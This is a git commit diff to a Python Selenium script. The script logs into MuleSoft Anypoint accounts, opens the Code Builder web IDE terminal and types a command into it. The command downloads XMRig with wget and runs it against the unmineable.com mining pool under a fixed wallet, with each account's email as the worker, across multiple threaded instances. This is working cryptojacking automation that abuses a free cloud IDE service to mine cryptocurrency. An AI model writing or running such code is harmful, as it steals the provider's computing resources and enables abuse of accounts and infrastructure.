aa8d78e4fda95bc4ea305d69c7b57d57b8b74c92
Pkoka99 <zekazeus123@gmail.com>
2025-04-30 19:04:54 +0700

    Update 1.py

--- 1.py
+++ 1.py
@@ -44,67 +44,60 @@ def open_browser(instance_number, email, password):
     options.add_experimental_option("excludeSwitches", ["enable-logging"])
     options.add_experimental_option("detach", True)
 
-    
+    driver = webdriver.Chrome(service=Service(chrome_driver_path), options=options)
+    driver.get(login_url)
+    print(f"{email} Open Chrome")
+    wait = WebDriverWait(driver, 30) 
     try:
-      
-      driver = webdriver.Chrome(service=Service(chrome_driver_path), options=options)
-      with focusl:
-        driver.get(login_url)
-        print(f"{email} Open Chrome")
-        wait = WebDriverWait(driver, 30) 
-        try:
-            username_field = wait.until(EC.presence_of_element_located((By.ID, "nameInput")))
-            password_field = driver.find_element(By.ID, "passwordInput")
-            username_field.send_keys(email)
-            password_field.send_keys(password)
-            password_field.send_keys(Keys.RETURN)
-            print(f"[{email}] ✅ Login submitted.")
-        except Exception as e:
-            print(f"[{email}] ❌ Login fields not found: {e}")
-        time.sleep(2)
-        if "codebuilder" not in driver.current_url:
-            driver.get("https://anypoint.mulesoft.com/codebuilder/")
+       username_field = wait.until(EC.presence_of_element_located((By.ID, "nameInput")))
+        password_field = driver.find_element(By.ID, "passwordInput")
+        username_field.send_keys(email)          
+        password_field.send_keys(password)
+        password_field.send_keys(Keys.RETURN)
+        print(f"[{email}] ✅ Login submitted.")
+    except Exception as e:
+        print(f"[{email}] ❌ Login fields not found: {e}")
+    time.sleep(2)
+    if "codebuilder" not in driver.current_url:
+      driver.get("https://anypoint.mulesoft.com/codebuilder/")
 
-        try:
-            launch_button = wait.until(EC.element_to_be_clickable((By.ID, "launch-your-webide-btn-card")))
-            launch_button.click()
-            print(f"[{email}] ✅ Clicked Launch button")
-        except:
-            print(f"[{email}] ❌ Launch button not found")
-        original_window = driver.current_window_handle
+    try:
+       launch_button = wait.until(EC.element_to_be_clickable((By.ID, "launch-your-webide-btn-card")))
+       launch_button.click()
+       print(f"[{email}] ✅ Clicked Launch button")
+    except:
+       print(f"[{email}] ❌ Launch button not found")
+    original_window = driver.current_window_handle
 
 # Wait for new window/tab to open
-        WebDriverWait(driver, 30).until(EC.number_of_windows_to_be(2))
+    WebDriverWait(driver, 30).until(EC.number_of_windows_to_be(2))
 
 # Switch to the new window
-        for handle in driver.window_handles:
-            if handle != original_window:
-                driver.switch_to.window(handle)
-                break  #
+    for handle in driver.window_handles:
+        if handle != original_window:
+           driver.switch_to.window(handle)
+           break  #
 
-        print("Switched to Code Builder window")
-        time.sleep(150)
-        print(driver.current_url)
-        actions = ActionChains(driver)
-        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
-        try:
-            textarea = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-screen")))
-            textarea.click()
-            print("✅ Command executed.")
-        except:
-            print(f"[{email}] ❌ area not found ")
+    print("Switched to Code Builder window")
+    time.sleep(150)
+    print(driver.current_url)
+    actions = ActionChains(driver)
+    actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
+    try:
+        textarea = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-screen")))
+        textarea.click()
+        print("✅ Command executed.")
+    except:
+        print(f"[{email}] ❌ area not found ")
     
-        try:
-            textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
-            print("SUCCES")        
-            textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#u7pd-53qq -p x --tls --threads=4 -k")
-            textarea1.send_keys(Keys.ENTER)
-            sss += 1
-        except:
-            print(f"[{email}] ❌ terminal not found ")
+    try:
+        textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
+        print("SUCCES")        
+        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#u7pd-53qq -p x --tls --threads=4 -k")
+        textarea1.send_keys(Keys.ENTER)
+    except:
+        print(f"[{email}] ❌ terminal not found ")
 
-    except Exception as e:
-        print(f"[{email}] ❌ Error: {str(e)}")
 
 # Launch multiple instances
 threads = []
